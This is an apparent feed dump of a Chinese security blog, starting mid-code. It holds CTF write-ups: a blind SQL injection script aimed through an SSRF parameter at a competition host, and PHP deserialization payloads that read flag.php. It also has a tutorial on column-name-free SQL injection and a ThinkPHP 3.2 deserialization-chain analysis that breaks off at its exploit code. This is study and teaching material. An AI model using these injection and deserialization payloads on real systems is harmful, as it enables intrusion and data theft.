class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">asc_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">mydata = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">myfile = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)&#125;</span><br><span class="line">mycookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;jtq4q3fdfgnckcrd52a6nhf90a&#x27;</span>&#125;</span><br><span class="line">ip = <span class="string">&#x27;http://183.129.189.60:10015/?url=&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ses=requests.session()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;http://localhost//se1f_Log3n.php?username=admin\&#x27;and 1=1%23password=admin&#x27;</span></span><br><span class="line">url = ip + quote(payload)</span><br><span class="line">r = ses.post(url=url, data=mydata, files=myfile, cookies=mycookie)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/08/v3xsRomFOT4pNMi.png" alt="image-20210408125333703.png"></p><p>and 1=1 and 1=2返回结果不同</p><p><img src="https://i.loli.net/2021/04/08/EU4xlF9ZoHLRSY8.png" alt="image-20210408125535401.png"></p><p>盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">asc_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">mydata = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;mochu7&#x27;</span>&#125; </span><br><span class="line">myfile = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;mochu7.txt&#x27;</span>,<span class="string">&#x27;mochu7&#x27;</span>)&#125;</span><br><span class="line">mycookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;jtq4q3fdfgnckcrd52a6nhf90a&#x27;</span>&#125;</span><br><span class="line">ip = <span class="string">&#x27;http://183.129.189.60:10015/?url=&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ses=requests.session()</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> asc_str:</span><br><span class="line">        payload = <span class="string">&#x27;http://localhost//se1f_Log3n.php?username=mochu\&#x27;or ascii(mid((select flag from ctf.secret),&#123;&#125;,1))=&#123;&#125;%23password=mochu7&#x27;</span>.<span class="built_in">format</span>(l,<span class="built_in">ord</span>(s))</span><br><span class="line">        url = ip + quote(payload)</span><br><span class="line">        r = ses.post(url=url, data=mydata, files=myfile, cookies=mycookie)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;correct?&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += s</span><br><span class="line">            print(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://i.loli.net/2021/04/08/HfSAWcwMKevJi1U.png" alt="image-20210408124649418.png"></p><h1 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h1><p>调用和SplFileObject内置类进行反序列化。FilesystemIterator用于遍历目录文件，SplFileObject用于读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125; hello ctfer</span><br></pre></td></tr></table></figure><p>列出目录下文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;FilesystemIterator&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;/var/www/html/&quot;</span>;</span><br><span class="line">        <span class="comment">//echo new  $this-&gt;class ($this-&gt;para);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>发现目录aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE，目录下存在flag.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;76863e29-3ca5-4471-ac1a-57b8f52336b7.machine.dasctf.com&#x2F;?pop&#x3D;O%3A1%3A%22A%22%3A3%3A&#123;s%3A5%3A%22class%22%3Bs%3A18%3A%22FilesystemIterator%22%3Bs%3A4%3A%22para%22%3Bs%3A14%3A%22%2Fvar%2Fwww%2Fhtml%2F%22%3Bs%3A5%3A%22check%22%3BN%3B&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/08/W1Yx7u258UhrTAH.png" alt="image-20210327164433163.png"></p><p>发现目录aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE，目录下存在flag.php</p><p>读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">        <span class="comment">//echo new  $this-&gt;class ($this-&gt;para);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/08/Zxu8s3KSEatnDbT.png" alt="image-20210408131112136.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/mochu7777777/article/details/115276176">https://blog.csdn.net/mochu7777777/article/details/115276176</a></p><p><a href="https://www.plasf.cn/articles/dasctf202103.html">https://www.plasf.cn/articles/dasctf202103.html</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/115272645">https://blog.csdn.net/rfrder/article/details/115272645</a></p><p><a href="https://whoamianony.top/2021/03/29/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/MAR%20DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/">https://whoamianony.top/2021/03/29/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/MAR%20DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>无列名注入总结</title>
    <link href="/2021/04/05/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <url>/2021/04/05/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在information_schema被过滤时，无法获取到表名和列名，这时候就需要通过无列名注入来获取信息。</p><h1 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h1><p>无列名注入也是需要表名的，可以先通过InnoDb和sys来获取表名</p><h2 id="InnoDb"><a href="#InnoDb" class="headerlink" title="InnoDb"></a>InnoDb</h2><p>要求：Mysql版本&gt;5.6</p><p>inndb中有innodb_index_stats和innodb_table_stats两张表，这两张表中存储了数据库和其中的数据表的信息，但是没有存储列名。</p><p>查询表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database();</span><br></pre></td></tr></table></figure><h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>要求：Mysql版本&gt;5.7</p><p>通过查询sys.schema_table_statistics_with_buffer和sys.schema_auto_increment_columns获得表名</p><h3 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name)from sys.schema_auto_increment_columns where table_schema&#x3D;database();</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/05/rGXQ39aUF2iejdp.png" alt="image-20210405132743251.png"></p><h3 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database();</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/05/fpPjoHKAIeC1kcV.png" alt="image-20210405132837988.png"></p><h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p>无列名注入的原理是依靠union select时产生的虚拟表来查询数据。</p><p>正常的表</p><p><img src="https://i.loli.net/2021/04/05/FDtjrXGe6RUHWP5.png" alt="image-20210405131730910.png"></p><p>union select产生的虚拟表，必须保证查询列数是准确的</p><p><img src="https://i.loli.net/2021/04/05/JpVIDu3oLfjya6z.png" alt="image-20210405131751893.png"></p><p>只要给虚拟表取一个别名，即可查询其中的数据，下面查询了第二列的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;2&#96; from (select 1,2,3 union select * from users)n;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/05/Y2jrt3ITfaL5MNe.png" alt="image-20210405131922758.png"></p><p>在反引号被过滤时还可以使用给列起别名的方式查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2 as b,3 union select * from users)n;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/05/6XKGLpoBsx4QWyR.png" alt="image-20210405132241116.png"></p><p>还可以使用<code>表名.列名</code>这种形式，n是我们给虚拟表起的别名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select n.2 from (select 1,2,3 union select * from users)n;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/05/1oPOW4lgibyE9rG.png" alt="image-20210405132353492.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化复现</title>
    <link href="/2021/04/04/ThinkPHP-v3-2-%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/04/04/ThinkPHP-v3-2-%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>参考</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect</a></p><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>框架会自动生成一个默认控制器，在默认控制器下添加一个测试用的<code>Action</code>即可。</p><p><img src="https://i.loli.net/2021/04/04/iLEek5D1lz3bgjP.png" alt="image-20210404213944476.png"></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><strong>1./ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</strong></p><p>$this-&gt;img可控，寻找由destory方法的类</p><p><img src="https://i.loli.net/2021/04/04/oDcj2GmXh3uq4Ct.png" alt="image-20210404165131700.png"></p><p><strong>2./ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</strong></p><p>destroy()方法中调用delete()方法 ，$this-&gt;handle属性可控，可传入任意类并调用它的delete()方法。<code>destroy()</code>方法需要传入一个<code>$sessID</code>，但是前面调用<code>destroy()</code>没有传值，而<code>$this-&gt;sessionName</code>可控，这样整个传入的参数都可控</p><p><img src="https://i.loli.net/2021/04/04/uOkjS3M1wNxGe5f.png" alt="image-20210404191359058.png"></p><p><strong>3./ThinkPHP/Library/Think/Model.class.php</strong></p><p>$options数组为传入参数，可控，其他属性也可控，这样在两个if语句中出现的四个条件都可以满足，就可以第二次调用delete()方法也就是自身，而这次的参数变成了<code>$this-&gt;data[$pk]</code>，完全可控。而且通过下面这条语句可以调用任意类的delete()方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;db-&gt;delete($options);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/04/lYngvwJMqINAerV.png" alt="image-20210404192205171.png"><img src="https://i.loli.net/2021/04/04/amTpCFxkPuoArYO.png" alt="image-20210404193309170.png"></p><p><img src="https://i.loli.net/2021/04/04/j2B1oIRhydegsQT.png" alt="image-20210404191751409.png"></p><p><strong>4./ThinkPHP/Library/Think/Db/Driver.class.php</strong></p><p>$options数组为传入参数，可控。因此$table可控，$table被拼接到$sql，再被传入<code>$this-&gt;execute()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$table&#x3D;$this-&gt;parseTable($options[&#39;table&#39;]);</span><br><span class="line">$sql&#x3D;&#39;DELETE FROM &#39;.$table;</span><br></pre></td></tr></table></figure><p>最终执行$this-&gt;execute($sql,!empty($options[‘fetch_sql’]) ? true : false);</p><p><img src="https://i.loli.net/2021/04/04/lYngvwJMqINAerV.png" alt="image-20210404192205171.png"></p><p>execute()方法中调用initConnect()方法初始化数据库</p><p><img src="https://i.loli.net/2021/04/04/1m6tjDx49d8zcyl.png" alt="image-20210404194434180.png"><img src="https://i.loli.net/2021/04/04/pbGfcN9m3tRh7MS.png" alt="image-20210404194513308.png"></p><p>在initConnect()方法中，可以通过修改属性，满足条件empty($this-&gt;config[‘deploy’])，调用connect()。</p><p><img src="https://i.loli.net/2021/04/04/2dGsbot8HpRjXvc.png" alt="image-20210404194631408.png"></p><p>这里新建了一个PDO对象，使用<code>$this-&gt;config</code>里的配置去创建数据库连接，然后去执行前面拼接的<code>DELETE</code>SQL语句。</p><p><img src="https://i.loli.net/2021/04/04/hG8Ol3xDi7JnaPF.png" alt="image-20210404194732354.png"></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span 